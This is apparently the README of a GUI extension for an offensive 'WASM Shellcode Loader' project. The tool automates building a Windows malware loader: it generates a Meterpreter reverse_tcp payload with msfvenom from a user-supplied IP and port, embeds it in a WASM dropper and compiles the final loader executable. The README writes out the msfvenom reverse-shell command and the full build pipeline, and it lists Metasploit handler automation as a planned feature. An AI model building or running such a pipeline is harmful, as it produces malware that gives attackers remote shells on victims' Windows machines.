# WASM Shellcode Loader GUI Extension

This GUI extension automates the entire WASM shellcode loader workflow using egui. It provides a user-friendly interface to replace all the manual command-line operations documented in the main README.

## Features

### 🔧 Tool Management
- **Tool Status Checking**: Automatically detects if required tools are installed
  - `wasm-pack` (for building WASM modules)
  - `wabt`/`wasm2wat` (for converting WASM to WAT format)
  - `msfvenom` (for payload generation)
  - `cargo` (Rust build system)

- **Automated Installation**: One-click installation of missing tools
  - Installs `wasm-pack` via `cargo install`
  - Downloads and extracts `wabt` from GitHub releases (platform-specific)

### 🛠️ Payload Configuration
- **IP Address & Port Input**: Easy-to-use input fields for target configuration
- **Command Generation**: Automatically generates the correct `msfvenom` command
- **Copy to Clipboard**: One-click copying of generated commands

### 🏗️ Build Pipeline Automation
- **Full Pipeline**: Complete automation from payload generation to final binary
- **Individual Steps**: Granular control over each build step:
  1. Build WASM dropper with `wasm-pack`
  2. Convert WASM to WAT format using `wasm2wat`
  3. Build final WASM loader executable

### 📊 Status & Feedback
- Real-time status updates for all operations
- Clear error reporting and success notifications
- Visual indicators for tool availability

## Usage

### Running the GUI
```bash
cd /path/to/WASM-Shellcode-Loader
cargo run -p wasm_gui
```

### Workflow
1. **Check Tools**: Click "Check Tools" to see what's installed
2. **Install Missing Tools**: Use install buttons for any missing dependencies
3. **Configure Payload**: Enter your IP address and port
4. **Generate Command**: Create the msfvenom command (copy to clipboard if needed)
5. **Run Pipeline**: Either run the full automated pipeline or individual steps

### Manual Payload Integration
If you prefer to generate the payload manually:
1. Use the generated `msfvenom` command or run your own
2. Copy the resulting payload into `./wasm_dropper/src/lib.rs`
3. Update the `WASM_MEMORY_BUFFER` and `WASM_MEMORY_BUFFER_SIZE` as needed
4. Use the GUI to run the build pipeline

## Technical Details

### Project Structure
```
wasm_gui/
├── Cargo.toml      # Dependencies including eframe, egui, tokio
└── src/
    └── main.rs     # Main GUI application
```

### Dependencies
- `eframe` - Native egui framework
- `egui` - Immediate mode GUI library
- `tokio` - Async runtime for background operations
- `serde`/`serde_json` - Serialization support
- `env_logger` - Logging functionality

### Platform Support
- **Cross-platform GUI**: Works on Windows, Linux, and macOS
- **Windows-specific loader**: The final `wasm_loader` binary only runs on Windows (by design)
- **Tool installation**: Automatically detects platform for wabt installation

### Build Commands Automated
The GUI automates these manual commands:

```bash
# Tool installation
cargo install wasm-pack
curl -L -o wabt.tar.gz <platform-specific-wabt-url>
tar -xzf wabt.tar.gz -C wabt --strip-components 1

# Payload generation  
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f rust

# Build pipeline
cd wasm_dropper && wasm-pack build --release && cd ..
./wabt/bin/wasm2wat ./target/wasm32-unknown-unknown/release/wasm_dropper.wasm -o ./wasm_loader/src/wasm_dropper.wat
cd wasm_loader && cargo build --release && cd ..
```

## Integration with Original Project

The GUI extension is seamlessly integrated into the existing workspace:
- Added as a new workspace member in `Cargo.toml`
- Does not modify existing `wasm_dropper` or `wasm_loader` functionality
- Uses the same build artifacts and follows the same workflow
- Fully compatible with manual command-line usage

## Error Handling

The GUI includes comprehensive error handling:
- Network failures during tool downloads
- Missing dependencies or build failures  
- Invalid input validation
- Platform-specific compatibility checks
- Clear error messages with suggested solutions

## Future Enhancements

Potential improvements could include:
- Metasploit handler automation
- Built-in text editor for payload modification
- Build artifact management and cleanup
- Configuration file persistence
- Advanced payload encoding options
- Real-time build logs display

## Security Considerations

- All tool downloads are from official GitHub releases
- No credentials or sensitive data are stored
- Payload data remains in local files only
- Standard cargo security practices apply